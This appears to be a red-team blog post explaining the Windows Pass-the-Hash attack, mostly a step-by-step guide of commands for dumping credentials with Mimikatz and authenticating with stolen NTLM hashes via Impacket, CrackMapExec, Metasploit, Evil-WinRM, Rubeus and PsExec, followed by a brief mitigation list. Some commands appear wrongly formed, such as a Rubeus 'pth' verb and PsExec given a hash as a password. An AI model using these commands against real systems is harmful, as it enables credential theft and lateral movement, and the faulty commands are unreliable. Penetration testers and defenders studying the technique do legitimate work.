---
layout: blog
title: "Pass-the-Hash Attack: An In-Depth Look with Examples and Commands"
tags: redteaming c2
comments: true
date: 2023-04-08
---

# Pass-the-Hash Attack: An In-Depth Look with Examples and Commands

Pass-the-Hash (PtH) is a well-known attack technique that targets Windows authentication systems. It enables attackers to use a user's password hash, instead of the plain-text password, to authenticate to network resources. In this blog post, we will dive into the details of this attack, discuss examples and commands, and provide a real-world attack scenario.

## Understanding Pass-the-Hash

Windows systems primarily use two types of authentication protocols: NTLM (NT LAN Manager) and Kerberos. Both protocols store password hashes, which are fixed-length representations of a user's password. When a user logs in, Windows checks the entered password's hash against the stored hash. If they match, the user is granted access.

In a PtH attack, the attacker captures a user's password hash and uses it to authenticate to network resources as the targeted user, without needing to know the plain-text password. This allows the attacker to bypass many security controls and gain unauthorized access to sensitive data.
<br/>
## How to Perform a Pass-the-Hash Attack

Here is a step-by-step guide to performing a PtH attack, including the tools and commands:

1.**Capture the password hash**: The first step is to obtain the target user's password hash. This can be done using various methods, such as dumping hashes from the Security Account Manager (SAM) database or extracting hashes from a system's memory using tools like Mimikatz.

Example command using Mimikatz:
```bash
mimikatz.exe privilege::debug sekurlsa::logonpasswords
```

<br/>
<br/>
2.**Use the captured hash for authentication**: Once the password hash is obtained, the attacker can use it to authenticate to network resources. Tools like PsExec or CrackMapExec can be used to perform PtH attacks.

### For Kali Linux/Linux

+ **Impacket (pth-winexe)**
```bash
pth-winexe -U TARGET_DOMAIN/USER%NTLM_HASH //TARGET_IP cmd
```
+ **Impacket (secretsdump.py)**
```bash
python3 secretsdump.py -ntds TARGET_DOMAIN/USER:PASSWORD@TARGET_IP
```
+ **CrackMapExec**
```bash
crackmapexec smb TARGET_IP -u USER -H NTLM_HASH
```
+ **Metasploit Framework (auxiliary module: smb_login)**
```bash
msfconsole
use auxiliary/scanner/smb/smb_login
set RHOSTS TARGET_IP
set SMBDomain TARGET_DOMAIN
set SMBUser USER
set SMBPass NTLM_HASH
run
```
+ **Evil-WinRM**
```bash
evil-winrm -i TARGET_IP -u USER --hash NTLM_HASH
```
+ **Wmiexec**
```bash
wmiexec.py -hashes LM_HASH:NTLM_HASH TARGET_DOMAIN/USER@TARGET_IP
```
+ **Smbexec**
```bash
smbexec.py -hashes LM_HASH:NTLM_HASH TARGET_DOMAIN/USER@TARGET_IP
```

### For Windows

+ **Mimikatz**
```bash
mimikatz.exe "sekurlsa::pth /user:USER /domain:TARGET_DOMAIN /ntlm:NTLM_HASH /run:cmd.exe" "exit"
```

+ **PowerShell Empire**
```bash
.\Invoke-PowerShellTcp.ps1 -Hash NTLM_HASH -Username USER -Domain TARGET_DOMAIN -IPAddress TARGET_IP
```

+ **PsExec**
```bash
psexec.exe \\TARGET_IP -u TARGET_DOMAIN\USER -p NTLM_HASH cmd.exe
```
+ **Rubeus**
```bash
Rubeus.exe pth /user:USER /domain:TARGET_DOMAIN /ntlm:NTLM_HASH /target:TARGET_IP
```


## Conclusion

Pass-the-Hash attacks are dangerous because they exploit inherent weaknesses in Windows authentication mechanisms. To defend against PtH attacks, organizations should adopt a multi-layered security approach, including:

- Implementing privileged access management (PAM)
- Regularly patching and updating software
- Using strong, unique passwords
- Enabling security features like Credential Guard
- Restricting the use of administrative accounts

Understanding how Pass-the-Hash attacks work, along with effective mitigation strategies, is essential to protect your organization from unauthorized access and data breaches.
